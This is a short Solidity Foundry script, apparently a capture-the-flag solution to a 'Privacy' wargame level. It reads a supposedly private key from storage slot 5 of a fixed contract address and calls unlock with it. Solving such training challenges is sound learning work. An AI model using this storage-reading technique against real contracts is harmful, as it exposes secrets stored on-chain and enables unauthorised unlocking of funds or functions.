// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";

interface IPrivacy {
    function unlock(bytes16 _key) external;
}

contract PrivacySolution is Script {
    function run() external {
        address instance = 0xe2b60051621156C4655335983460F7de50064fD6;
        bytes32 slotValue = vm.load(instance, bytes32(uint256(5)));
        bytes16 key = bytes16(slotValue);

        vm.startBroadcast();
        IPrivacy(instance).unlock(key);
        vm.stopBroadcast();
    }
}